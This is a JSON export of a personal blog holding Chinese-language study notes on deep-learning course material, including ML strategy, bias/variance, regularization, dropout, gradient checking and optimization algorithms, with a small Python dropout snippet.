{"meta":{"title":"【W】","subtitle":null,"description":"Less intrests , more interest .","author":["W"],"url":"https://0410wzn.top","root":"/"},"pages":[{"title":"tags","date":"2021-10-09T10:11:56.000Z","updated":"2021-10-09T10:12:29.226Z","comments":true,"path":"tags/index.html","permalink":"https://0410wzn.top/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-10-10T02:36:05.000Z","updated":"2021-10-10T02:36:05.623Z","comments":true,"path":"categories/index.html","permalink":"https://0410wzn.top/categories/index.html","excerpt":"","text":""},{"title":"link","date":"2021-11-27T15:41:21.000Z","updated":"2021-11-27T15:41:46.622Z","comments":true,"path":"link/index.html","permalink":"https://0410wzn.top/link/index.html","excerpt":"","text":""}],"posts":[{"title":"DL（三）","slug":"DL（三）","date":"2022-04-09T14:37:21.000Z","updated":"2022-04-17T08:06:15.201Z","comments":true,"path":"2022/04/09/DL（三）/","link":"","permalink":"https://0410wzn.top/2022/04/09/DL%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"Structuring Machine Learning ProjectsML Strategy (1)Why ML Strategy（机器学习策略）什么是机器学习策略？ 假设我们正在调试🐱分类器，经过一段时间调试，系统的准确率达到了90%，但还有不少能提升准确率的方法，在下图中我们列出一部分 上述的诸多想法我们都可以进行测试，但问题在于，如果做出了错误的选择，可能会浪费大量时间，朝错误的方向前进（同时注意不到错误），因此我们需要一些策略，来判断哪些方法是值得一试的，哪些是可以舍弃的，或者提出新的方法 Orthogonaization（正交化）搭建机器学习模型时所面临的一个重要的问题是：可以尝试和改变的东西太多了 以这台老电视机为例。当我们要调整图像时，需要调整旋钮，我们可以很简单的知道，如果有一个旋钮集成了图像的长、宽、色度等信息时，我们要对图像进行合适的调整其实是很麻烦的，因此，电视的设计者将旋钮分为多个，每一个都对应着不同的属性，这即是正交化的思想（正交即为互成90度） 我们将其放在机器学习中思考 对于一个监督学习系统。通常需要调整系统的“旋钮”，确保四件事： 系统在训练集上的效果不错 系统在开发集上有良好表现 系统在测试集上表现良好 真实结果反馈 对于“旋钮”，当算法在成本函数上不能很好的拟合训练集，这个旋钮就意味着“训练更大的网络”或者“选择更好的算法”；当算法对开发集的拟合很差，那么应该有一组独立的“旋钮”去调试；对于开发集，有“正则化”和“增大训练集”等“旋钮”；对于测试集，“旋钮“可能是”更大的开发集”&lt;这种情况有可能是对开发集过拟合了&gt;；对于反馈，”旋钮“就有可能是”改变开发集“或”成本函数“&lt;错误可能是开发集分布设置不正确或是成本函数测量的指标不对&gt; Single number evaluation metric（单一数字评估指标）对于下面的应用 上面两列分别是它的查准率和查全率，但当我们想判断选择哪个时，问题来了？这两者孰优孰劣？ 我们引入F1分数（两者的调和平均数）进行比较，这种方法有助于快速迭代 通过它进行判断，我们最终选择了A Satisficing and Optimizing Metric要把顾及到的所有事物组合成单实数评估指标，有时并不容易，因此，在一些情况下，设立满足与优化指标是很有用的 下图为例 假设我们最看重的是准确度，但同时我们也应该注意到识别图像所花费的时间，因此我们可以将准确度与运行时间组合成一个整体评估指标 我们可以选择对两个数值加权求和，但通常，选择一个 ”定义优化 &amp;&amp; 满足指标“ 的分类器应该更为合适 Train/Dev/Test Distributions本节主题：如何设立开发集和测试集？ 开发集与测试集应来自于同一分布（可以取同一分布内的数据随机分布） 开发集与测试集的结果应该是符合预期的 Size of the Dev and Test Sets怎样确定开发集与测试集的规模？ Old Model 怎样选择测试集的规模呢？ 我们知道，测试集的目的是完成开发之后，测试集用来评估其性能，因此，方针就是，让测试集尽可能大，能够以高置信度评估性能 When to Change Dev/Test Sets and Metrics?（什么时候改变开发/测试集与指标）假设正在创建一个猫分类器，试图找到很多猫的照片，算法A与B分别有3%与5%的错误率，这样看来，算法A似乎表现得很好 但是当实际应用时，算法A错把XX图像当成猫图，尽管它推送了更多猫图，但是与需求（only 🐱！）发生了冲突，而B，5%的错误率使分类器得到较少的图像，但是并没有传进XX图，因此从实际出发，算法B实际上是一个更好的算法 在上述事件中，发生的就是，事件A在评估指标上做的更好，但从需求的角度出发，它无疑是一个比较糟糕的算法 在这种情况下，评估指标加上开发集都倾向于选择A，但需求制定者更偏向于B，因此当你的评估指标无法正确衡量算法之间的优劣排序时，在这种情况下，原来的指标错误的预测算法A是更好的算法，这就发出了信号，你应该改变评估指标或者开发集/测试集了！ 此时使用的分类错误率指标 $Error\\,=\\,\\frac{1}{m_{dev}}\\,\\sum^{m_{dev}}_{i=1}I\\{y^{(i)}_pred\\,+\\,y^{(i)}\\}$ 其中一个修改评估指标的方法是：添加权重项 $Error\\,=\\,\\frac{1}{m_{dev}}\\,\\sum^{m_{dev}}_{i=1}w^{(i)}I\\{y^{(i)}_pred\\,+\\,y^{(i)}\\}$ 通过这个公式。我们给予不符合预期的图片更大的权重，以此让它们迅速变大 从上面的例子我们可以得出一个粗浅的结论：如果评估指标无法正确评估好算法的排名，我们需要改变它 Why Human-level Performance?机器学习往往擅长模仿人能做的事 可以发现，一旦超过人类的水平，增长的明显变缓，最终贴近于上面的那条线 — 贝叶斯最优错误率 Avoidable Bias在计算机视觉上，人类达到的误差与贝叶斯错误率相差不多，这时候我们将它们近似，在这种情况下，具有同样的训练错误率与开发错误率，我们决定于减少偏差（方差）的策略，而训练错误率与开发错误率之间的偏差，就大概说明了算法在方差问题上的改善空间，可以运用正则化等手段 我们将贝叶斯错误率的估计与训练错误率之间的差值，称为可避免偏差，这一概念，说明了有一些别的偏差，或错误率有个无法超越的最低水平 由此，对于上述情况左边适合调整可避免偏差，而右边调整方差因此，不同的场景，有不同的策略 Understanding Human-level Performance思考人类水平错误率的方式之一，是将其作为贝叶斯错误率的替代或估计（这时我们往往将其看作多数人考虑后的错误率，而非个人） 在定义人类水平错误率时，要清楚目标所在，如果要表明可以超过单个人类，那么就有理由在某些场合部署你的系统 Improving your Model Performance（改善模型表现）总结：正交化 设立开发集与测试集 用人类水平错误率估计贝叶斯错误率 估计可避免偏差与方差 想让一个监督学习算法达到实用，基本上需要完成2件事： 首先，算法对训练集的拟合很好，这可以看作可避免偏差很低 其次，在训练集中效果优良，然后推广到开发集和测试集也很好，这就是说方差不是太大 在正交化精神下，我们模拟出了”旋钮”，可以修正可偏差问题（训练更大的网络/训练更久），还有一套独立的“旋钮”可以用来处理方差问题（正则化/收集更多训练数据） 总结一下前几解的步骤，若想提高机器学习系统的性能，可以看训练错误率与贝叶斯估计值之间的距离，从而判断可避免偏差的大小（对训练集大小的优化还有多少空间），然后看开发错误率与训练错误率之间的距离，从而判断方差问题的大小（应该做多少努力，使算法表现能够从训练集推广到开发集） 当目标在减少可避免偏差时，可以尝试： 使用规模更大的模型 训练更久 使用更好的优化算法（加入momentum/RMSprop）/算法（Adam） 寻找更好的新神经网络架构 一组更好的超参数 当目标在改变方差时，可以尝试： 收集更多数据训练（可以更好的推广到系统看不到的开发集数据） 正则化 数据扩增 寻找更好的新神经网络架构（超参数搜索） ML Strategy (2)Carrying Out Error Analysis（误差分析）我们以下面的情况为例 对于已经大致训练好的🐱图分类器，它的错误率为90%，但是它对一些🐕图仍束手无策 这种情况下，我们难道还需要专门做一个项目去处理🐕？这样值得吗？ 这里提供一套错误分析流程，去帮助判断这个方向是否值得努力 收集部分带有错误标记的开发集例子 挨个观察标记中有多少是🐕 查看🐕在错误标记中所占的比例，判断对其进行更改的效果是否值得 人工统计在一些时候，确实能节省大量时间 使用表格判断方法是极为可取的 Cleaning up Incorrectly labeled data当观察数据时，发现某些输出标签Y是错的，是否值得花时间去修正呢？ 首先去考虑训练集，深度学习算法对于训练集中的随机错误是相当健壮的，即如果错误项离随机错误项不太远， 若错误足够随机，那么不管这些错误可能也没问题，而并不需要花太多时间去修复它们 深度学习对随机错误比较健壮，但对系统性的错误相对就没那么健壮了 而当开发集与测试集标记出现问题时该怎么办呢？ 当你担心上述问题时，一般推荐在进行错误分析时，添加一个额外的列，统计它们的错误例子数 对于极少数例子数，你的分类器输出和标签不同，是因为标签出错，而非分类器出错 同时，你也可以统计因为标签错误所占的百分比 现在面临的问题是：是否值得修正6%标记出错的例子 建议是：如果错误非常严重，很大程度上影响了你在开发集上评估算法的能力，那么就应该去花时间修正错误的标签，但当它们没有严重影响到用开发集评估成本偏差的能力，那么处理的必要就相对较轻了 这里再提示一下设立开发集的主要目的：用它来从两个分类器A和B中选择一个 我们有时无法直观的从开发集中选择一个分类器，因为它无法体现哪个分类器比较好，标记出错产生的错误率即是其原因，这是就有充分的理由去修正开发集里的错误标签 我们这时就可以对上图右方开发集的错误标签动手，因为其标记出错 ，对算法错误的整体评估标准有严重的影响；而在左边的开发集中，标记错误对算法影响的百分比还是相对较小的 而再修改开发集数据之前，手动重新检查标签，并尝试修正一些标签，还有一些额外的方针与原则需要考虑 不管用何种修正手段，都要同时作用在开发集与测试集上（开发集是一个目标，当你命中目标之后，希望算法能够推广到测试集上，这样能够更高效的在来自同一分布的开发集和测试集上迭代） 同时检验算法判断正确和错误的例子，错误的可能还有正确的，反之同理，若是只修改正确的，对算法的偏差可能会变大 上述的两种注意事项实现较麻烦，因此也通常不会这么做，原因是：如果分类器很准确，那么判断错的次数比判断正确的次数要少得多 亲自花时间去检验错误是非常值得的 Training and testing on different distributions深度学习对训练数据的“胃口”很大，当你收集到足够多带标签的数据构成训练集时，算法效果最好，即便它们都来自于和开发集与测试集不同的数据来训练，这里有一些做法可以来处理训练集与测试集存在差异的状况 以下题为例： 对于来自于web与app的🐱图 我们要通过上面的数据，划分数据，给出以下两种方案： Option1 Option2 我们的需求是建立一个系统，令其在处理手机上传图片分布时效果良好，因此我们选择第二种，因为它精确的“对准”了目标 缺点在于训练集分布和开发集、测试集分布并不一样 Bias and Variance with mismatched data distributions估计学习算法的偏差和方差来确定接下来的优先方向，但是当训练集和开发、测试集来自于不同分布时，分析偏差和方差的方式可能不同 通过对人类水平错误率、训练集错误率、训练 - 开发集错误率、开发集错误率进行分析，可以推断出可避免方差、方差、、数据不匹配问题各自多大 Addressing data mismatch（定位数据不匹配）对来自不同分布的训练集与开发测试集，错误分析显示存在数据不匹配问题的状况，没有完全系统的解决方案，但可以尝试以下方案： 亲自进行错误分析，尝试了解训练集与开发集的具体差异 收集更多类似开发集和测试集的数据（包括人工合成） Transfer learning（迁移学习）神经网络从一个任务中习得知识，并将只是应用到另一个独立的任务中，即为迁移学习 假设已经训练好一个图像识别神经网络 可以是判断🐱🐕，我们想将其用于X光诊断，做法是，将最后一层以及进入最后一层的权重删掉，然后为最后一层重新赋予权重，让后将其放在放射诊断数据上训练 什么时候迁移学习是有意义的？ 若你想从任务A学习，并迁移一些新知识到任务B，那么 当A与B都有同样的输入x时，迁移学习是有意义的， 当任务A的数据比任务B多得多时，迁移学习的意义更大（在想提高任务B的性能，因为B的每个数据更有价值 ） 任务A的低层次特征可以帮助B的学习，那么迁移学习更有意义一些 Multi-task learning（多任务学习）在迁移学习中，步骤是串行的，只是从任务A学习，然后迁移到任务B，而在多任务学习中，步骤是并行的，即试图让单个神经网络同时做多件事，希望每个任务都能帮助到其他所有任务 以上图为例，我们想同时辨别图片中的车、警示牌、行人、路灯等，因此对于输入图像$x^{(i)}$，那么将不再是一个标签(label)$y^{(i)}$，而是有四个标签 因此，$y^{(i)}$是个$4*1$向量 与之对应的$Y$，及如上所示 与softmax回归的主要区别在于，softmax将单个标签分配给单个样本，而这张图可以存在很多不同标签 训练一个神经网络，试图最小化函数，就需要多任务学习，因为现在的需求是建立单个神经网络，观察每张图，解决4个问题 同时，多任务学习也可以处理只有部分物体被标记的情况 多任务学习什么时候有意义？ 训练的一组任务可以共用低层次特征 通常情况下，每个任务的数据量都相当大 多任务学习往往在以下场合更有意义： 可以训练一个足够大的网络去完成所有任务 因此多任务学习的替代方法是，为每个任务训练一个单独的神经网络 End-to-end deep learning（端到端深度学习）举以下例子， 目标是输入x，比如说一段音频，然后将其映射到一个输出y（即这段音频的听写文本）， 传统上，语音识别需要很多桥段的处理，首先会提取一些特征（MFCC），提取出一些低层次特征之后，可以应用机器学习算法，在音频片段中找到音位（声音的基本单位），将音位串在一起构成独立的词，然后将词串起来构成音频片段的听写文本，输出即是听写文本 端到端则是输入音频，直接输出听写文本 注意的是，端到端的方法适用于大规模数据进行训练，而较小规模的数据在传统流水线上效果反而更优秀 ，而如果是中间规模的数据，也可以使用中间件的方法，输入的依然还是音频，然后绕过特征提取，直接尝试从神经网络输出音位 比如人脸识别系统，当人接近传感器时，会先捕捉整体图像（中间件），再通过裁剪获取局部的人脸信息，再进行辨别 在数据对直接进行端到端学习有困难，而能较好地解决子问题时，通过解决子问题再回归到一端其实更为适合 端到端的优点: 数据说话 所需的手工设计的组件更少 端到端的缺点： 需要大量数据 排除了可能有用的手工组件 学习算法有两个数据来源，一个是数据，另一个是手工设计的组件、功能······ 当尝试使用端到端深度学习构建深度学习系统时，关键问题在于数据量的多少，已有数据能否支持直接学到从x映射到y","categories":[],"tags":[{"name":"Deep_Learning","slug":"Deep-Learning","permalink":"https://0410wzn.top/tags/Deep-Learning/"}]},{"title":"DL（二）","slug":"DL（二）","date":"2022-03-29T14:17:42.000Z","updated":"2022-04-17T08:05:44.249Z","comments":true,"path":"2022/03/29/DL（二）/","link":"","permalink":"https://0410wzn.top/2022/03/29/DL%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"Improving Deep Neural Networks: Hyperparameter Tuning, Regularization and Optimization改善深层神经网络：超参数调试、正则化以及优化 Practical Aspects of Deep LearningTrain/Dev/Test sets训练神经网络时，我们需要做很多决策，例如：神经网络分为多少层、每层含有多少个隐藏单元、学习速率是多少、各层采用哪些激活函数…… 在创建新应用的过程中，我们不能从一开始就准确预测出这些信息和其它超参数，实际上，应用型机器学习是一个高度迭代的过程 同时，创建高质量的训练数据集、验证集和测试集也有助于提高循环效率 需要注意的是，要确保验证集和测试集的数据来自于同一分布 Bias/Variance（偏差/方差） 理解偏差与方差的重要依据是，训练集误差和验证集误差 Train set error 1% 15% 15% Dev set error 11% 16% 30% high variance high bias high variance and high bias 最优误差，一般也被称为标准误差，其值接近于0% 通过查看训练集误差，可以判断数据的拟合情况可以判断是否有偏差(bias)问题，从而查看错误率的高低，当完成训练集训练，开始验证集验证时，可以来判断方差是否过高 Basic “recipe” for machine learning训练神经网络时用到的基本方法： 当初始模型训练完成后，首先判断算法的偏差高不高，如果偏差较高，就去评估训练集/测试集的性能，如果偏差确实比较高，甚至无法拟合训练集，就去选择一个新网络或是用更长的时间来训练网络 当偏差降低到可以接受的数值，先通过检查验证集性能检查一下方差是否无误，如果方差高，最好的解决办法就是采用更多数据，但当我们无法获得更多数据时，可以通过尝试正则化来减少过拟合 不断尝试，直到找到一个低偏差、低方差的框架 正则化是一种非常有效的减少方差的手段，正则化时会出现偏差方差权衡问题，偏差可能略有增加，如果网络足够大，增幅通常不会太高 Regularization（正则化）当怀疑神经网络过度拟合了数据，即存在高偏差问题，一种方法是准备更多的数据，另一种方法就是正则化 对于成本函数，$L2$正则化之后是这样的 $J(w,b)\\,=\\,\\frac{1}{m}*\\sum_{i=1}^ml(\\widehat{y}^{(i)},y^{[i]})\\,+\\,\\frac{\\lambda}{2m}||w||^2_2$ $||w||^2_2\\,=\\,\\sum^{nx}_{j=1}w^2_j\\,=\\,w^Tw$（$L2$范数） Q：为什么只需要正则化$w$，而不需要正则化$b$呢？ A：是可以加上的，不过因为$w$通常是一个高维参数矢量，已经可以表达高偏差问题，$w$有很多参数，我们不可 能拟合所有参数，而$b$只是单个数字，所以$w$几乎涵盖所有参数，而不是$b$，因为$b$只是众多参数中的一个 $L1$正则化则是： $\\frac{\\lambda}{2m}\\sum^{nx}_{i=1}||w||\\,=\\,\\frac{\\lambda}{2m}||w|_1$ $\\lambda$是正则化参数，python中要用$lambd$来代替$lambda$，防止与保留字冲突 如何在神经网络中实现正则化？ 神经网络含有一个成本函数 $J(w^{[1]},\\,b^{[1]},\\,...\\,,\\,w^{[l]},\\,b^{[l]})\\,=\\,\\frac{1}{m}*\\sum_{i=1}^ml(\\widehat{y}^{(i)},y^{[i]})\\,+\\,\\frac{\\lambda}{2m}||w||^2_2$ $||w||^2_2\\,=\\,\\sum^{n^{[l - 1]}}_{i=1}\\sum^{n^{[l]}}_{j=1}(w^{[l]}_j)^2$ 上述表达式是因为$w$是形状为$(n^{[l-1]},n^{[l]})$的矩阵，该矩阵范数被称为”Frobenius norm”（弗洛贝尼乌斯范数），它表示一个矩阵中所有元素的平方和 还如何使用该范数实现梯度下降呢？ 用backprop计算出$dw$的值，backprop会给出j对$w^{[l]}$的偏导数，将$w^{[l]}$替换为$w^{[l]}\\,-\\,\\alpha w^{[l]}$，就是之前我们额外增加的正则化项 再对上式做出如下改变 $dw^{[l]}\\,=\\,(backprop)\\,+\\,\\frac{\\lambda}{m}w^{[l]}$ 替换后，$w^{[l]}$的定义就更新为了： $w^{[l]}\\,=\\,w^{[l]}\\,-\\,\\alpha\\,[(backprop)\\,+\\,\\frac{\\lambda}{m}w^{[l]}]\\,=\\,w^{[l]}\\,-\\,\\frac{\\alpha\\lambda}{m}w^{[l]}\\,-\\,\\alpha(backprop)$ 在其中，矩阵$W$减去$\\frac{\\alpha\\lambda}{m}$倍的它，即令矩阵$W$乘以系数$(1\\,-\\,\\frac{\\alpha\\lambda}{m})$，该系数小于1，因此$L2$正则化也被称为“权重衰减” Why regularization reduces overfitting (为什么正则化可以减少方差问题) 当$\\lambda$被设置的足够大，权重矩阵$W$被设置为接近于0的值，直观理解就是把多隐藏单元的权重设为0，于是基本消除了这些隐藏单元的许多影响 Dropout regularization（随机失活正则） 假设在训练上图所示的神经网络，它存在过拟合，这即是dropout要处理的 dropout会遍历网络的每一层，并设置消除神经网络中结点的概率 选择一些节点，删除一些节点的连线，得到一个更小的网络，然后用backprop方法进行训练 那么，该如何实施dropout呢？ 方法有几种，最常用的是inverted dropout（反向随机失活），以下为例子 1234567891011# 这是一个随机矩阵# 这里的keep.prop是一个常数，表示保留某个隐藏单元的概率# 假设让krrp.prop为0.8，则意味着消除任意一个隐藏单元的概率为0.2d3 = np.random.rand(a3.shape[0], a3.shape[3]) &lt; keep.prop# 从三层中获取激活函数# 其作用即时过滤d3中所有等于0的元素a3 = np.multply(a3, d3)# 向外拓展a3a3 /= keep.prop 需要注意的是，我们在测试阶段不使用dropout函数，因为在测试阶段进行预测时，我们不期望输出结果是随机的如果测试阶段应用dropout函数，预测会受到干扰，即确保在测试阶段不执行dropout来调整数值范围，激活函数的预期结果也不会发生变化。 Understanding dropout 如果担心某些层比其他层更容易发生过拟合，可以把某些层的keep_prob值设置的比其他层更低，确定是为了使用交叉验证，需要搜集更多的超级参数；另一种方案是在一些层上应用dropout，而一些层则不用，应用dropout的层只含有一个超级参数，即keep_prob 但请牢记，dropout是一种正则化方法，它有助于预防过拟合，因此，除非算法过拟合，一般是不会用到的 Other regularization methods除了上述的两种方法，还有几种方法可以减少神经网络中的过拟合 一 数据扩增 当数据不足时，对于图片，可以翻转/随意裁剪来扩大数据集，额外生成假训练数据；对于文字，可以随意旋转/扭曲数字来增加数据 因此，数据扩增可以作为正则化方法使用，实际功能也与其类似 二 early stopping 运行梯度下降时，我们可以绘制训练误差，或只绘制代价函数$J$的优化过程，在训练集上用0-1记录分类误差次数呈下降趋势 除此之外，我们还可以绘制验证集误差 可以发现，验证集误差通常先呈下降趋势，在某个节点处重新回升 当还未在神经网络上运行太多迭代过程时，参数$w$接近于0，因为在随机初始化$w$时，它的值可能是较小的随机值，而在迭代和训练过程中，$w$的值会变得越来越大，early stopping即是，在中间点停止迭代过程，我们得到一个$w$值中等大小的弗洛贝尼乌斯范数 其优点是，只运行一次坡度下降，找出$w$的值，而无需尝试$L2$正则化超级参数$\\lambda$的很多值 Normalizing inputs（归一化输入）当训练神经网络时，其中一个加速训练的方法就是归一化输入 归一化输入需要两个步骤： 第一是零均值化 $\\mu\\,=\\,\\frac{1}{m}\\sum^m_{i=1}x^{[i]}$；$x\\,:=\\,x\\,-\\,\\mu$ 上面式子的意思是：移动训练集，直到它完成零均值化 如下图 第二步是归一化方差 上图中的特征$X1$方差比特征$X2$的方差要大得多 我们要做的： $\\sigma^2\\,=\\,\\frac{1}{m}\\sum^m_{i=1}x^{[i]}**2$ **是节点$y$的平方，$\\sigma^2$是一个向量，它的每个特征都有方差 $x \\,/=\\sigma^2$ 为什么要归一化输入？ 对于代价函数，如果我们使用非归一化输入，函数就会如下图一般，呈细长狭窄状 而归一化之后 不归一化时，由于在空间上分布也不是平滑的，使得梯度下降法需要小步长、多次迭代才可能实现目的，而归一化后，梯度下降法能够更直接的使用较大步长查找最小值，这使得代价函数优化起来更简单也更快速 Vanishing/exploding gradients（梯度 消失/爆炸 ）当训练一个极深的神经网络时 如果权重$w$只比1略大一点，或者说只比单位矩阵大一点，神经网络的激活函数将爆炸式增长 如果权重$w$只比1略小一点，在神经网络中，激活函数将以指数级递减 一个防止办法就是 — 权重初始化 Weight initialization for deep networks（神经网络的权重初始化） 对于这样一个简易的神经元 $Z\\,=\\,w_1x_1\\,+w_2x_2\\,+\\,…\\,+\\,w_nx_n$（暂且省略$b$） 我们可以发现，$n$越大，我们希望的$w$越小 最合理的方法就是，设置$w_i\\,=\\,\\frac{1}{n}$ （$n$表示神经元的输入特征数量） 实际上要做的就是，设置某层的权重矩阵$w^{[l]}\\,=\\,np.random.randn(shape)\\,*\\,np.sqrt(\\frac{1}{n^{[l-1]}})$ 对于tanh函数，可以使用下图第一个公式 Numerical approximation of gradients（梯度的数值逼近）在执行backprop时，有一个步骤叫做梯度检验，它的作用是确保backprop正确实施，为了逐渐实现梯度检验，首先要了解如何对梯度做数值逼近 在梯度检验时，我们使用双边误差，即$\\frac{f(\\theta+\\epsilon)-f(\\theta-\\epsilon)}{2\\epsilon}$，而不使用单边公差，因为它不够准确 Gradient Checking假设网络中有以下参数，为了执行梯度检验，首先要做的就是把所有参数转换成一个巨大的向量数据$\\theta$ 即$J(w^{[1]},\\,b^{[1]},\\,…\\,,\\,w^{[l]},\\,b^{[l]})\\,=\\,J(\\theta)$ 接着，得到与$w$和$b$顺序相同的数据，用他们来初始化巨大向量$d\\theta$，它与$\\theta$具有相同维度 下面的问题是$d\\theta$与代价函数$J$的梯度或坡度有何关系，下面即是检验的过程 首先要明确$J$是超级参数$\\theta$的一个函数 为了实施梯度检验，需要做的就是循环执行，从而对每个i，也就是对每个$\\theta$组成元素，计算$d\\theta \\,approx[i]$的值 由上节课的的知识我们知道 上述式子的值 $\\approx\\,d\\theta^{[i]}\\,=\\,\\frac{\\delta J}{\\delta \\theta}$ $d\\theta^{[i]}$是代价函数的偏导数 经过对所有值进行此运算，最后得到两个向量，其中之一即使$d\\theta$的逼近值$d\\theta approx$，它与$d\\theta$具有相同维度，我们要做的就是验证这些向量是否彼此接近 如何定义两个向量互相接近？ 计算两个向量距离$d\\theta approx-d\\theta$的欧几里得范数$||d\\theta approx-d\\theta||_2$（误差平方之和），然后求平方根，得到欧式距离，之后用向量长度做归一化，结果为 $\\frac{||d\\theta approx-d\\theta||_2}{||d\\theta approx||_2 + ||d\\theta||_2}$ （分母只是用来预防这些向量太小或太大，分母使得方程式变为比率） 如果得到的$\\varepsilon$是$10^{-7}$，或更小一点，这意味着导数逼近很可能是正确的， 但如果其范围在$10^{-5}$范围内，需要注意一下，确保一下没有一项误差过大，如果有，那么这里可能存在bug 值为$10^{-3}$或比它更大，应该非常担心是否存在bug Gradient Checking implementation notes 不要在训练中使用梯度检验，它只用于调试 如果算法的梯度检验失败，要检查所有项，试着找出bug 在实施梯度检验时，，如果使用正则化，请注意正则项，当调试时，将dropout关上再进行调试 Optimization Algorithms（优化算法）Mini-batch gradient descent（Mini-batch梯度下降法）向量化可以有效的对m个例子进行计算，允许在处理整个训练集同时，无需明确某个明确的公式，因此我们要把数据放到巨大的矩阵$X$中去 尽管向量化可以使我们较为轻松的处理大量数据的样本，但如果m很大的话，处理数度依旧会变缓慢 在对整个训练集执行梯度下降法时，必须处理整个训练集，然后才能执行一步梯度下降法，然后需要重新处理数据，才能进行下一步梯度下降法 如果在处理完所有数据之前，先让梯度下降法处理一部分，相信算法速度会更快 将训练集分割为小一点的子训练集，这些子集就被取名为”Mini-batch”，显示格式即为$X^$与$Y^$ （这里回顾一下括号，小括号上标指第几个元素，中括号指神经网络的层数） 与原本同时处理整个batch训练集样本不同，Mini-batch梯度下降每次同时处理的是单个的mini-batch $X^$与$Y^$，而不是同时处理全部的$X$和$Y$训练集 通过上图可以发现，实现的基本步骤与与原本执行梯度下降法别无二致，区别就在于对象变为了 $X^$与$Y^$， Understanding mini-batch gradient descent 当m=1时，就变为了“随机梯度下降法”，它的每一项都是一个mini-batch。 而“随机梯度下降法”在寻找最小值时，大部分时候都是朝着全局最小值前进，但有些时候也会因为单个样本方向不对从而远离最小值，因此随机梯度下降法是有很多噪声的，平均来看，它最终会接近最小值，不过有时候也会出现方向错误。 因为随机梯度下降法永远不会收敛，而是会一直在在最小值附近活动，但并不会达到最小值并停留于此 随机梯度下降法的优点是，在处理单个数据是表现优异；但其缺点是，会失去所有向量化带来的加速，因为一次性只处理了一个训练样本，这样效率过于低下 因此，选择不大不小的mini-batch尺寸，会发现两个好处，一方面，得到了大量向量化，加快了多次处理样本速度；另一方面，无需等待整个训练集被·处理完 ，就可以进行后续工作 Exponentially weighted averages（指数加权平均）再去了解一些其他算法之前，首先要了解指数加权平均 以温度为例 如果我们要计算趋势，也就是温度的局部平均值/移动平均值，要做的是 $v_0\\,=\\,0$； $v_1\\,=\\,0.9*v_0\\,+\\,0.1\\theta_1$； $v_2\\,=\\,0.9*v_1\\,+\\,0.1\\theta_2$. …..； $vt\\,=\\,0.9*v{t-1}\\,+\\,0.1\\theta_t$ 如此计算，再用红线作图，得到如下结果 我们得到了移动平均值，每日温度的指数加权平均值 改写一下式子 $vt\\,=\\,\\beta*v{t-1}\\,+\\,(1-\\beta)\\theta_t$ 同时在计算时，可将$v_t$视为大概是$\\frac{1}{(1-\\beta)}$的每日温度，如果$\\beta$为0.9，就是上面的红线 我们取一个稍大一点的值 — 0.98，这即是平均了一下过去50天的温度，作图后得到以下绿线 当我们取高值的时候，会发现曲线平缓了一些，那是因为多平均了几天的温度，因此这个曲线波动更小、更加平坦，缺点是曲线进一步右移，平均了更多数据，指数加权公式，在温度变化时，适应地更缓慢一些 我们再取一个较小的值 — 0.5，由于数据少，波动也更为明显，如下图黄线所示 因此，我们可以通过调整指数加权平均数来寻找适合的“中间的某个值”，就像上图的红线一样 Understanding exponentially weighted averages沿用上一题得到的公式 可以知道$V_{100}$即是选取的每日温度与指数衰减函数相乘，然后求和 Bais correction in exponentially weighted averagesBais correction — 偏差修正 Gradient descent with momentum（动量梯度下降法）基本思想：计算梯度的指数加权平均数，并利用该梯度更新权重 上图是batch梯度下降法的实例，可以看出，在寻找最小梯度时经历了不少上下波动，而这种频繁的上下波动也减缓了梯度下降法的速度，让我们无法使用较大的学习率，因为如果使用大学习率，结果可能会摆动偏离函数的范围 我们用另一种角度观察，在纵轴上，我们希望减慢学习；而在横轴上，我们希望加快学习 因此，在动量梯度下降法中，在第t次迭代的过程中，计算微分$dw、db$ 使用上述公式更新$w$与$b$，来减缓梯度下降的幅度 RMSpropRMSprop算法，全称为root mean square prop算法，它也起到加速梯度下降的作用 Adam optimization algorithm Learning rate decay（学习率衰减）加快学习算法的一个办法就是，随时间慢慢减小学习率，也就是我们所说的“学习率衰减” 为什么要计算学习率衰减 假设使用mini-batch梯度下降法，mini-batch数量不大，大概64或者128个样本，如我们在前面分析的一样，它将会在迭代过程中出现“噪音”，下降朝向最小值，但不会精确收敛 但如果我们减小学习率的话，在初期，学习率较大，学习相对较快，但随着$\\alpha$变小，“步伐”也会慢慢变小，最后，查找的值会在最小值附近的一小块区域里摆动，而不会在最小值附近大幅度摆动 进行学习率衰减的公式如下 或者是指数衰减 The problem of local optima（局部最优问题）曾经，局部最优是一个很令人困扰的问题， 就像上图一样，似乎每处都分布着局部最优，梯度下降，或者某个算法可能困在某个局部最优解中，而不会抵达全局最优 但这些理解并不正确 事实上，当我们创建一个神经网络，梯度为0的点往往不是这个图中的局部最优点，实际上，成本函数的零梯度点往往是鞍点 实际上，我们对低纬度空间的大部分直觉，往往并不能应用到高维度空间中 那么，如果局部最优并非问题（在训练存在大量参数的大规模网络时不太可能困在极差的局部最优中），问题是什么？ 我们可以从上图发现，平稳段会减缓学习（平稳段是一块区域，其中导数长时间接近于0），它使得学习十分缓慢，这即是我们面对的问题 Hyperparameter Tuning, Batch Normalization and Programming Frameworks超参数调试、Batch正则化和程序框架 Tuning process（调试处理）参数数量是训练网络时面临的大问题，结果证实，一些超参数比其他的更为重要，例如学习率$\\alpha$、momentum、mini-batch的大小以及隐藏单元 在深度学习中，我们验证（两个参数）的方法是，在空间中随意取一定数量的点，分别验证参数 在找到的效果优秀的点周围再划分区域进行验证，即从粗糙到精细 Using an appropriate scale to pick hyperparameters（为超参数选择合适的范围）在上一例中，我们知道，随机取值会提高神经网络的效率，但是，随机取值并不是在有效值范围内的随机均匀取值，而是选择合适的参数，用于探究超参数 对于取点，加入我们是在0.0001至1的数轴上取点，那么0.1至1这个范围大概率会占用90%的搜索资源，而在0.0001至0.1之间，只有10%的搜索资源 因此，使用对数标尺搜索超参数的方式会更加合理 Hyperparameters Tuning in Practice: Pandas vs. Caviar Panda是计算一个模型，然后一直去维护 Caviar是计算多个模型，选择最优 两种方法的选择是计算资源决定的 Normalizing Activations in a Network（正则化/归一化函数） 在神经网络，已知一些中间值，假设有隐藏单元值，从$z^{[1]}$到$z^{[m]}$（以下表示为$z^{[l][i]}$） 如下计算平均值 Fitting Batch Norm into a Neural Network 在实践中，Batch归一化通常与训练集的mini-batch一起使用，下图是过程演示 